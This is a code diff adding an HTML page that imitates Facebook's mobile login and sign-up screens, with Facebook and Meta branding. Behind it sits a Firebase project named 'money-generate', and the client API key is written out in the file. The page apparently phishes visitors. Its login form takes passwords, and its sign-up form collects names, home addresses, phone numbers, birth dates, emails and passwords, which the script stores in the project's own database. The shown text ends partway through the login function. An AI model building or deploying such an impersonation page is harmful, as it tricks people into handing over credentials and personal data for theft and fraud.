@@ -1,0 +1,1333 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - Log In or Sign Up</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            color: #050505;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .fb-container {
+            width: 100%;
+            max-width: 480px;
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 20px 16px;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+
+        /* Language Bar */
+        .lang-bar {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+            font-size: 14px;
+            color: #65676b;
+            cursor: pointer;
+            margin-top: 10px;
+            padding: 8px 16px;
+            border-radius: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .lang-bar:hover {
+            background-color: #f0f2f5;
+            color: #1877f2;
+        }
+
+        /* Center Content Box */
+        .center-box {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            flex: 1;
+            justify-content: center;
+            padding-bottom: 40px;
+        }
+
+        .fb-logo-large {
+            color: #1877f2;
+            font-size: 72px;
+            margin-bottom: 30px;
+            animation: fadeInDown 0.8s ease;
+        }
+
+        @keyframes fadeInDown {
+            0% {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Form Styling */
+        .auth-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            animation: fadeInUp 0.6s ease;
+        }
+
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .form-row .input-group {
+            flex: 1;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 52px;
+            padding: 0 14px;
+            font-size: 16px;
+            border: 1px solid #ccd0d5;
+            border-radius: 8px;
+            background: #ffffff;
+            outline: none;
+            color: #050505;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .input-field:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .input-field.error {
+            border-color: #e41e3f;
+            box-shadow: 0 0 0 2px rgba(228, 30, 63, 0.2);
+        }
+
+        .input-field.success {
+            border-color: #31a24c;
+            box-shadow: 0 0 0 2px rgba(49, 162, 76, 0.2);
+        }
+
+        .input-icon-right {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #65676b;
+            font-size: 18px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .input-icon-right:hover {
+            color: #1877f2;
+        }
+
+        .field-label {
+            font-size: 12px;
+            color: #65676b;
+            margin-bottom: 4px;
+            display: block;
+            text-align: left;
+            font-weight: 600;
+        }
+
+        /* Buttons */
+        .btn-primary {
+            width: 100%;
+            height: 48px;
+            background-color: #1877f2;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary:hover {
+            background-color: #166fe5;
+            transform: scale(1.01);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Animated Login Button */
+        .btn-primary .btn-text {
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary .btn-loader {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .btn-primary .btn-loader i {
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .btn-primary.loading .btn-text {
+            display: none;
+        }
+
+        .btn-primary.loading .btn-loader {
+            display: flex;
+        }
+
+        .btn-primary.success {
+            background-color: #31a24c;
+        }
+
+        .btn-primary.success .btn-text {
+            display: none;
+        }
+
+        .btn-primary.success .btn-loader {
+            display: flex;
+        }
+
+        .btn-primary.success .btn-loader i {
+            animation: none;
+        }
+
+        .btn-primary.error {
+            background-color: #e41e3f;
+        }
+
+        .btn-primary.error .btn-text {
+            display: none;
+        }
+
+        .btn-primary.error .btn-loader {
+            display: flex;
+        }
+
+        .btn-primary.error .btn-loader i {
+            animation: none;
+        }
+
+        /* Button Shine Effect */
+        .btn-primary::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent 40%,
+                rgba(255, 255, 255, 0.1) 45%,
+                rgba(255, 255, 255, 0.2) 50%,
+                rgba(255, 255, 255, 0.1) 55%,
+                transparent 60%
+            );
+            transform: translateX(-100%) rotate(45deg);
+            transition: transform 0.6s ease;
+        }
+
+        .btn-primary:hover::after {
+            transform: translateX(100%) rotate(45deg);
+        }
+
+        .btn-outline {
+            width: 100%;
+            height: 48px;
+            background-color: transparent;
+            color: #1877f2;
+            font-size: 16px;
+            font-weight: 600;
+            border: 1px solid #1877f2;
+            border-radius: 24px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .btn-outline:hover {
+            background-color: #f0f7ff;
+        }
+
+        .btn-outline:active {
+            transform: scale(0.98);
+        }
+
+        .forgot-link {
+            text-align: center;
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-top: 15px;
+            display: block;
+            transition: color 0.3s;
+        }
+
+        .forgot-link:hover {
+            color: #0d65d9;
+            text-decoration: underline;
+        }
+
+        /* Bottom Footer Meta */
+        .footer-meta {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            padding-bottom: 10px;
+        }
+
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #050505;
+            font-weight: 700;
+            font-size: 15px;
+            letter-spacing: 0.5px;
+        }
+
+        .meta-logo i {
+            color: #1877f2;
+            font-size: 18px;
+        }
+
+        /* View Sections Control */
+        .auth-section {
+            display: none;
+            width: 100%;
+        }
+
+        .auth-section.active {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        /* Back Arrow */
+        .back-arrow {
+            position: absolute;
+            top: 20px;
+            left: 16px;
+            font-size: 20px;
+            color: #050505;
+            background: none;
+            border: none;
+            cursor: pointer;
+            display: none;
+            z-index: 10;
+            padding: 10px;
+            border-radius: 50%;
+            transition: background-color 0.3s;
+        }
+
+        .back-arrow:hover {
+            background-color: #f0f2f5;
+        }
+
+        .auth-section.active ~ .back-arrow.signup-back {
+            display: block;
+        }
+
+        /* Error message alert */
+        .error-msg {
+            color: #e41e3f;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 5px;
+            display: none;
+            animation: shake 0.4s ease;
+            padding: 8px 12px;
+            background: #fde8ec;
+            border-radius: 8px;
+            width: 100%;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .success-msg {
+            color: #31a24c;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 5px;
+            display: none;
+            animation: fadeInUp 0.4s ease;
+            padding: 8px 12px;
+            background: #e8f5e9;
+            border-radius: 8px;
+            width: 100%;
+        }
+
+        /* Password toggle */
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #65676b;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 5px;
+            border-radius: 50%;
+            transition: background-color 0.2s;
+        }
+
+        .toggle-password:hover {
+            color: #1877f2;
+            background-color: #f0f2f5;
+        }
+
+        /* Responsive */
+        @media (max-width: 400px) {
+            .fb-container {
+                padding: 15px 12px;
+            }
+            .fb-logo-large {
+                font-size: 56px;
+                margin-bottom: 20px;
+            }
+            .form-row {
+                flex-direction: column;
+                gap: 8px;
+            }
+            .input-field {
+                height: 46px;
+                font-size: 14px;
+            }
+            .btn-primary, .btn-outline {
+                height: 44px;
+                font-size: 14px;
+            }
+        }
+
+        /* Toast notification */
+        .toast-notification {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: rgba(0, 0, 0, 0.85);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 9999;
+            opacity: 0;
+            transition: all 0.4s ease;
+            pointer-events: none;
+            max-width: 90%;
+            text-align: center;
+        }
+
+        .toast-notification.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast-notification.success {
+            background: rgba(49, 162, 76, 0.95);
+        }
+
+        .toast-notification.error {
+            background: rgba(228, 30, 63, 0.95);
+        }
+
+        /* Input animation */
+        .input-group .input-field:focus + .input-highlight {
+            width: 100%;
+        }
+
+        .input-highlight {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            width: 0;
+            height: 2px;
+            background: #1877f2;
+            transition: all 0.3s ease;
+            transform: translateX(-50%);
+            border-radius: 0 0 4px 4px;
+        }
+
+        .input-field:focus ~ .input-highlight {
+            width: 100%;
+        }
+
+        /* Divider with text */
+        .divider-with-text {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #737373;
+            font-size: 13px;
+            margin: 10px 0;
+        }
+
+        .divider-with-text::before,
+        .divider-with-text::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dadde1;
+        }
+
+        .divider-with-text span {
+            padding: 0 10px;
+            white-space: nowrap;
+        }
+
+        /* Theme toggle */
+        .theme-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #e4e6eb;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #050505;
+        }
+
+        .theme-toggle:hover {
+            background: #d8dadf;
+            transform: scale(1.05);
+        }
+
+        /* Success Overlay */
+        .success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 9998;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .success-overlay.show {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            0% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+
+        .success-box {
+            background: white;
+            border-radius: 16px;
+            padding: 40px 30px;
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+            animation: popIn 0.5s ease;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .success-box .icon {
+            font-size: 64px;
+            color: #31a24c;
+            margin-bottom: 16px;
+        }
+
+        .success-box h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #050505;
+            margin-bottom: 8px;
+        }
+
+        .success-box p {
+            font-size: 14px;
+            color: #65676b;
+            margin-bottom: 20px;
+        }
+
+        .success-box .btn-go-home {
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            padding: 12px 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            width: 100%;
+        }
+
+        .success-box .btn-go-home:hover {
+            background: #166fe5;
+        }
+
+        .success-box .btn-go-home:active {
+            transform: scale(0.98);
+        }
+
+        .dark-theme .success-box {
+            background: #242526;
+            color: #e4e6eb;
+        }
+
+        .dark-theme .success-box h2 {
+            color: #e4e6eb;
+        }
+
+        .dark-theme .success-box p {
+            color: #b0b3b8;
+        }
+
+        .dark-theme body {
+            background-color: #18191a;
+        }
+
+        .dark-theme .fb-container {
+            background-color: #242526;
+        }
+
+        .dark-theme .input-field {
+            background-color: #3a3b3c;
+            border-color: #3e4041;
+            color: #e4e6eb;
+        }
+
+        .dark-theme .input-field:focus {
+            border-color: #1877f2;
+        }
+
+        .dark-theme .fb-container {
+            color: #e4e6eb;
+        }
+
+        .dark-theme .lang-bar {
+            color: #b0b3b8;
+        }
+
+        .dark-theme .lang-bar:hover {
+            background-color: #3a3b3c;
+        }
+
+        .dark-theme .divider-with-text {
+            color: #b0b3b8;
+        }
+
+        .dark-theme .divider-with-text::before,
+        .dark-theme .divider-with-text::after {
+            border-bottom-color: #3e4041;
+        }
+
+        .dark-theme .meta-logo {
+            color: #e4e6eb;
+        }
+
+        .dark-theme .btn-outline {
+            color: #1877f2;
+            border-color: #1877f2;
+        }
+
+        .dark-theme .btn-outline:hover {
+            background-color: rgba(24, 119, 242, 0.1);
+        }
+
+        .dark-theme .forgot-link {
+            color: #1877f2;
+        }
+
+        .dark-theme .error-msg {
+            background-color: #3d1a1f;
+            color: #f5a3a3;
+        }
+
+        .dark-theme .success-msg {
+            background-color: #1a3d2a;
+            color: #81c784;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Success Overlay -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-box">
+            <div class="icon">
+                <i class="fa-solid fa-check-circle"></i>
+            </div>
+            <h2 id="successTitle">Success!</h2>
+            <p id="successMessage">You have been logged in successfully.</p>
+            <button class="btn-go-home" onclick="goToHome()">
+                <i class="fa-solid fa-house"></i> Go to Home
+            </button>
+        </div>
+    </div>
+
+    <!-- Theme Toggle Button -->
+    <button class="theme-toggle" onclick="toggleTheme()" id="themeToggle">
+        <i class="fa-solid fa-moon"></i>
+    </button>
+
+    <div class="fb-container" id="fbContainer">
+        <!-- Toast Notification -->
+        <div class="toast-notification" id="toastNotification"></div>
+
+        <!-- Back Arrow for Signup View -->
+        <button class="back-arrow signup-back" onclick="toggleAuthView('login')"><i class="fa-solid fa-arrow-left"></i></button>
+
+        <!-- Top Language Bar -->
+        <div class="lang-bar" onclick="showToast('English (UK) selected', 'info')">
+            <span>English (UK)</span>
+            <i class="fa-solid fa-chevron-down" style="font-size: 10px;"></i>
+        </div>
+
+        <!-- CENTER CONTENT CONTAINER -->
+        <div class="center-box">
+            
+            <!-- LOGIN VIEW SECTION -->
+            <div id="loginView" class="auth-section active">
+                <div class="fb-logo-large">
+                    <i class="fa-brands fa-facebook"></i>
+                </div>
+
+                <div id="loginError" class="error-msg"></div>
+
+                <form class="auth-form" onsubmit="handleLogin(event)">
+                    <div class="input-group">
+                        <input type="text" id="loginIdentifier" class="input-field" placeholder="Mobile number or email address" required autocomplete="username">
+                        <i class="fa-solid fa-circle-info input-icon-right"></i>
+                        <div class="input-highlight"></div>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="loginPassword" class="input-field" placeholder="Password" required autocomplete="current-password">
+                        <button type="button" class="toggle-password" onclick="togglePasswordVisibility('loginPassword', this)">
+                            <i class="fa-regular fa-eye"></i>
+                        </button>
+                        <div class="input-highlight"></div>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary" id="loginBtn">
+                        <span class="btn-text"><i class="fa-solid fa-right-to-bracket"></i> Log in</span>
+                        <span class="btn-loader">
+                            <i class="fa-solid fa-spinner"></i> Logging in...
+                        </span>
+                    </button>
+                </form>
+
+                <a href="#" class="forgot-link" onclick="showToast('Password recovery page coming soon', 'info')">Forgotten password?</a>
+
+                <div class="divider-with-text">
+                    <span>or</span>
+                </div>
+
+                <button type="button" class="btn-outline" onclick="toggleAuthView('signup')">
+                    <i class="fa-solid fa-user-plus" style="margin-right: 8px;"></i> Create new account
+                </button>
+            </div>
+
+            <!-- SIGNUP VIEW SECTION -->
+            <div id="signupView" class="auth-section">
+                <h2 style="font-size: 24px; font-weight: 700; margin-bottom: 8px; text-align: center;">Join Facebook</h2>
+                <p style="font-size: 14px; color: #65676b; text-align: center; margin-bottom: 24px;">We'll help you create a new account in a few easy steps.</p>
+
+                <div id="signupError" class="error-msg"></div>
+                <div id="signupSuccess" class="success-msg"></div>
+
+                <form class="auth-form" onsubmit="handleSignup(event)">
+                    <div class="form-row">
+                        <div class="input-group">
+                            <label class="field-label">First Name</label>
+                            <input type="text" id="signFirstName" class="input-field" placeholder="First name" required style="height: 44px; font-size: 14px;" autocomplete="given-name">
+                            <div class="input-highlight"></div>
+                        </div>
+                        <div class="input-group">
+                            <label class="field-label">Last Name</label>
+                            <input type="text" id="signLastName" class="input-field" placeholder="Surname" required style="height: 44px; font-size: 14px;" autocomplete="family-name">
+                            <div class="input-highlight"></div>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label class="field-label">Address</label>
+                        <input type="text" id="signAddress" class="input-field" placeholder="Your current address" required style="height: 44px; font-size: 14px;" autocomplete="street-address">
+                        <div class="input-highlight"></div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="input-group">
+                            <label class="field-label">Phone Number</label>
+                            <input type="tel" id="signPhone" class="input-field" placeholder="Mobile number" required style="height: 44px; font-size: 14px;" autocomplete="tel">
+                            <div class="input-highlight"></div>
+                        </div>
+                        <div class="input-group">
+                            <label class="field-label">Date of Birth</label>
+                            <input type="date" id="signDob" class="input-field" required style="height: 44px; font-size: 14px;">
+                            <div class="input-highlight"></div>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label class="field-label">Email Address</label>
+                        <input type="email" id="signEmail" class="input-field" placeholder="Email address" required style="height: 44px; font-size: 14px;" autocomplete="email">
+                        <div class="input-highlight"></div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="input-group">
+                            <label class="field-label">Password</label>
+                            <input type="password" id="signPassword" class="input-field" placeholder="New password" required style="height: 44px; font-size: 14px;" autocomplete="new-password">
+                            <button type="button" class="toggle-password" onclick="togglePasswordVisibility('signPassword', this)">
+                                <i class="fa-regular fa-eye"></i>
+                            </button>
+                            <div class="input-highlight"></div>
+                        </div>
+                        <div class="input-group">
+                            <label class="field-label">Confirm Password</label>
+                            <input type="password" id="signConfirmPassword" class="input-field" placeholder="Confirm password" required style="height: 44px; font-size: 14px;" autocomplete="new-password">
+                            <button type="button" class="toggle-password" onclick="togglePasswordVisibility('signConfirmPassword', this)">
+                                <i class="fa-regular fa-eye"></i>
+                            </button>
+                            <div class="input-highlight"></div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="btn-primary" id="signupBtn" style="margin-top: 10px;">
+                        <span class="btn-text"><i class="fa-solid fa-user-plus"></i> Sign Up</span>
+                        <span class="btn-loader">
+                            <i class="fa-solid fa-spinner"></i> Creating account...
+                        </span>
+                    </button>
+                </form>
+
+                <button type="button" class="btn-outline" style="margin-top: 12px; border: none; color: #1877f2; background: none;" onclick="toggleAuthView('login')">
+                    <i class="fa-solid fa-arrow-left" style="margin-right: 8px;"></i> Already have an account?
+                </button>
+            </div>
+
+        </div>
+
+        <!-- Bottom Footer Meta Branding -->
+        <div class="footer-meta">
+            <div class="meta-logo">
+                <i class="fa-solid fa-infinity"></i> Meta
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        // FIREBASE CONFIGURATION & INITIALIZATION
+        // ============================================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyDOJaV7zMLhtA-_z1nkcdbtaa3w7M_0Fh4",
+            authDomain: "money-generate-dbab3.firebaseapp.com",
+            databaseURL: "https://money-generate-dbab3-default-rtdb.firebaseio.com",
+            projectId: "money-generate-dbab3",
+            storageBucket: "money-generate-dbab3.firebasestorage.app",
+            messagingSenderId: "579756089926",
+            appId: "1:579756089926:web:abbe35377e3657889be047"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const auth = firebase.auth();
+
+        let isLoggingIn = false;
+        let isSigningUp = false;
+
+        // ============================================================
+        // THEME TOGGLE
+        // ============================================================
+        function toggleTheme() {
+            const body = document.body;
+            const btn = document.getElementById('themeToggle');
+            const isDark = body.classList.toggle('dark-theme');
+            
+            btn.innerHTML = isDark ? '<i class="fa-solid fa-sun"></i>' : '<i class="fa-solid fa-moon"></i>';
+            localStorage.setItem('theme', isDark ? 'dark' : 'light');
+        }
+
+        // Load theme preference
+        (function loadTheme() {
+            const theme = localStorage.getItem('theme');
+            if (theme === 'dark') {
+                document.body.classList.add('dark-theme');
+                document.getElementById('themeToggle').innerHTML = '<i class="fa-solid fa-sun"></i>';
+            }
+        })();
+
+        // ============================================================
+        // TOAST NOTIFICATION
+        // ============================================================
+        function showToast(message, type = 'info') {
+            const toast = document.getElementById('toastNotification');
+            toast.textContent = message;
+            toast.className = 'toast-notification ' + type;
+            
+            void toast.offsetWidth;
+            
+            toast.classList.add('show');
+            clearTimeout(toast._timeout);
+            toast._timeout = setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // ============================================================
+        // TOGGLE PASSWORD VISIBILITY
+        // ============================================================
+        function togglePasswordVisibility(inputId, button) {
+            const input = document.getElementById(inputId);
+            const icon = button.querySelector('i');
+            
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.className = 'fa-regular fa-eye-slash';
+            } else {
+                input.type = 'password';
+                icon.className = 'fa-regular fa-eye';
+            }
+        }
+
+        // ============================================================
+        // TOGGLE VIEW
+        // ============================================================
+        function toggleAuthView(viewName) {
+            const loginView = document.getElementById('loginView');
+            const signupView = document.getElementById('signupView');
+            const backArrow = document.querySelector('.signup-back');
+            
+            document.getElementById('loginError').style.display = 'none';
+            document.getElementById('signupError').style.display = 'none';
+            document.getElementById('signupSuccess').style.display = 'none';
+
+            if (viewName === 'signup') {
+                loginView.classList.remove('active');
+                signupView.classList.add('active');
+                backArrow.style.display = 'block';
+                window.scrollTo(0, 0);
+            } else {
+                signupView.classList.remove('active');
+                loginView.classList.add('active');
+                backArrow.style.display = 'none';
+                window.scrollTo(0, 0);
+            }
+        }
+
+        // ============================================================
+        // SET BUTTON STATE
+        // ============================================================
+        function setButtonLoading(buttonId, loading) {
+            const btn = document.getElementById(buttonId);
+            if (loading) {
+                btn.classList.add('loading');
+                btn.disabled = true;
+            } else {
+                btn.classList.remove('loading', 'success', 'error');
+                btn.disabled = false;
+            }
+        }
+
+        function setButtonSuccess(buttonId) {
+            const btn = document.getElementById(buttonId);
+            btn.classList.remove('loading');
+            btn.classList.add('success');
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                btn.classList.remove('success');
+                btn.disabled = false;
+                btn.querySelector('.btn-text').style.display = 'flex';
+                btn.querySelector('.btn-loader').style.display = 'none';
+            }, 2000);
+        }
+
+        function setButtonError(buttonId) {
+            const btn = document.getElementById(buttonId);
+            btn.classList.remove('loading');
+            btn.classList.add('error');
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                btn.classList.remove('error');
+                btn.disabled = false;
+                btn.querySelector('.btn-text').style.display = 'flex';
+                btn.querySelector('.btn-loader').style.display = 'none';
+            }, 2000);
+        }
+
+        // ============================================================
+        // SHOW SUCCESS OVERLAY
+        // ============================================================
+        function showSuccessOverlay(title, message) {
+            document.getElementById('successTitle').textContent = title;
+            document.getElementById('successMessage').textContent = message;
+            document.getElementById('successOverlay').classList.add('show');
+        }
+
+        function goToHome() {
+            document.getElementById('successOverlay').classList.remove('show');
+            // Show login form again
+            document.getElementById('loginView').classList.add('active');
+            document.getElementById('signupView').classList.remove('active');
+            document.querySelector('.signup-back').style.display = 'none';
+            // Clear form
+            document.getElementById('loginIdentifier').value = '';
+            document.getElementById('loginPassword').value = '';
+            // Reset button
+            const btn = document.getElementById('loginBtn');
+            btn.classList.remove('success');
+            btn.disabled = false;
+            btn.querySelector('.btn-text').style.display = 'flex';
+            btn.querySelector('.btn-loader').style.display = 'none';
+            // Clear errors
+            document.getElementById('loginError').style.display = 'none';
+            // Reset state
+            isLoggingIn = false;
+            isSigningUp = false;
+        }
+
+        // ============================================================
+        // HANDLE SIGNUP
+        // ============================================================
+        function handleSignup(e) {
+            e.preventDefault();
+            
+            if (isSigningUp) return;
+            isSigningUp = true;
+
+            const firstName = document.getElementById('signFirstName').value.trim();
+            const lastName = document.getElementById('signLastName').value.trim();
+            const address = document.getElementById('signAddress').value.trim();
+            const phone = document.getElementById('signPhone').value.trim();
+            const dob = document.getElementById('signDob').value;
+            const email = document.getElementById('signEmail').value.trim();
+            const password = document.getElementById('signPassword').value;
+            const confirmPassword = document.getElementById('signConfirmPassword').value;
+            const errorEl = document.getElementById('signupError');
+            const successEl = document.getElementById('signupSuccess');
+
+            errorEl.style.display = 'none';
+            successEl.style.display = 'none';
+
+            if (password !== confirmPassword) {
+                errorEl.style.display = 'block';
+                errorEl.innerText = '❌ Passwords do not match!';
+                isSigningUp = false;
+                return;
+            }
+
+            if (password.length < 6) {
+                errorEl.style.display = 'block';
+                errorEl.innerText = '❌ Password must be at least 6 characters!';
+                isSigningUp = false;
+                return;
+            }
+
+            setButtonLoading('signupBtn', true);
+
+            auth.createUserWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    const user = userCredential.user;
+                    
+                    const userData = {
+                        firstName: firstName,
+                        lastName: lastName,
+                        address: address,
+                        phone: phone,
+                        dob: dob,
+                        email: email,
+                        uid: user.uid,
+                        name: firstName + ' ' + lastName,
+                        createdAt: Date.now()
+                    };
+
+                    return database.ref('users/' + user.uid).set(userData);
+                })
+                .then(() => {
+                    setButtonSuccess('signupBtn');
+                    
+                    successEl.style.display = 'block';
+                    successEl.innerText = '✅ Account created successfully!';
+                    
+                    localStorage.setItem('isLoggedIn', 'true');
+                    localStorage.setItem('userEmail', email);
+                    localStorage.setItem('userUid', auth.currentUser.uid);
+                    
+                    showToast('✅ Account created successfully!', 'success');
+                    
+                    // Show success overlay instead of redirect
+                    showSuccessOverlay(
+                        'Account Created! 🎉',
+                        'Your account has been created successfully. You can now login.'
+                    );
+                    
+                    // Reset signup form
+                    document.getElementById('signFirstName').value = '';
+                    document.getElementById('signLastName').value = '';
+                    document.getElementById('signAddress').value = '';
+                    document.getElementById('signPhone').value = '';
+                    document.getElementById('signDob').value = '';
+                    document.getElementById('signEmail').value = '';
+                    document.getElementById('signPassword').value = '';
+                    document.getElementById('signConfirmPassword').value = '';
+                    
+                    isSigningUp = false;
+                })
+                .catch((error) => {
+                    setButtonError('signupBtn');
+                    errorEl.style.display = 'block';
+                    
+                    let errorMsg = error.message;
+                    if (error.code === 'auth/email-already-in-use') {
+                        errorMsg = '❌ This email is already registered. Please login.';
+                    } else if (error.code === 'auth/invalid-email') {
+                        errorMsg = '❌ Invalid email address.';
+                    } else if (error.code === 'auth/weak-password') {
+                        errorMsg = '❌ Password is too weak. Use at least 6 characters.';
+                    }
+                    errorEl.innerText = errorMsg;
+                    
+                    showToast('Signup failed: ' + errorMsg, 'error');
+                    isSigningUp = false;
+                });
+        }
+
+        // ============================================================
+        // HANDLE LOGIN
+        // ============================================================
+        function handleLogin(e) {
+            e.preventDefault();
+            
+            if (isLoggingIn) return;
+            isLoggingIn = true;
+
+            const identifier = document.getElementById('loginIdentifier').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            const errorEl = document.getElementById('loginError');
+
+            errorEl.style.display = 'none';
+
+            if (!identifier || !password) {
+                errorEl.style.display = 'block';
+                errorEl.innerText = '❌ Please fill in all fields';
+                isLoggingIn = false;
+                return;
+            }
+
+            setButtonLoading('loginBtn', true);
+
+            let email = identifier;
+            if (!identifier.includes('@')) {
+                database.ref('users').orderByChild('phone').equalTo(identifier).once('value')
+                    .then((snapshot) => {
+                        if (snapshot.exists()) {
+                            let userData = null;
+                            snapshot.forEach((child) => {
+                                userData = child.val();
+                            });
+                            if (userData && userData.email) {
+                                loginWithEmail(userData.email, password);
+                            } else {
+                                setButtonError('loginBtn');
+                                errorEl.style.display = 'block';
+                                errorEl.innerText = '❌ No account found with this phone number';
+                                isLoggingIn = false;
+                            }
+                        } else {
+                            setButtonError('loginBtn');
+                            errorEl.style.display = 'block';
+                            errorEl.innerText = '❌ No account found with this phone number';
+                            isLoggingIn = false;
+                        }
+                    })
+                    .catch((err) => {
+                        setButtonError('loginBtn');
+                        errorEl.style.display = 'block';
+                        errorEl.innerText = '❌ Error: ' + err.message;
+                        isLoggingIn = false;
+                    });
+                return;
+            }
+
+            loginWithEmail(email, password);
+        }
+
+        function loginWithEmail(email, password) {
+            const errorEl = document.getElementById('loginError');
+            errorEl.style.display = 'none';
+
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    const user = userCredential.user;
+                    setButtonSuccess('loginBtn');
+                    
+                    localStorage.setItem('isLoggedIn', 'true');
+                    localStorage.setItem('userEmail', user.email);
+                    localStorage.setItem('userUid', user.uid);
+                    
